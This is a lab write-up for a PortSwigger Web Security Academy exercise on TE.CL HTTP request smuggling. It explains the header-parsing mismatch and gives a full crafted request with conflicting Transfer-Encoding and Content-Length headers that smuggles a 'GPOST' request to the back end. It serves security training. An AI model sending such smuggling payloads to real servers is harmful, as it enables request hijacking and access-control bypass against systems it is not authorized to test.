#  HTTP - request smuggling, basic TE.CL vulnerability

## 📌 Lab Details
- **Title**: HTTP request smuggling, basic TE.CL vulnerability
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/a6aecbc5c1d7f95e7512642a6f11fcb8c5d568f7cd57ae0ce60a08c7140583b3?referrer=%2fweb-security%2frequest-smuggling%2flab-basic-te-cl

## 🔍 Summary
This lab demonstrates a **Transfer-Encoding: chunked (TE) / Content-Length (CL)** mismatch vulnerability. The front-end server supports **chunked encoding**, but the back-end server does **not**.
By crafting a malicious request with both `Transfer-Encoding: chunked` and `Content-Length` headers, we can smuggle an extra request to the back-end server, causing it to misinterpret the HTTP method of the next request (e.g., `GPOST`).

## 🛠 Steps to Solve
1. Intercept the request and send it to **Burp Repeater**.
2. Now, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0


   ```
3. The second response should say: `Unrecognized method GPOST`.  

## 📖 Key Takeaways
- **TE.CL vulnerabilities** happen when front-end and back-end servers parse request length differently.
- Adding both `Transfer-Encoding: chunked` and `Content-Length` causes confusion between servers.
- You can smuggle hidden requests by **manipulating chunk sizes** and **inserting CRLF sequences (`\r\n\r\n`)**.
- Always **disable** “Update Content-Length” in Burp when testing smuggling, or Burp will overwrite your crafted lengths.  

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/31ef7b3e-27e0-4ec8-b16c-653eb7b45471" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fbbb110f-f879-4788-a58c-b672e96fd4e4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fce744e2-4917-405b-b634-d98d302cb7e0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6b5fce6a-e458-473f-bfa8-865d979b931c" />
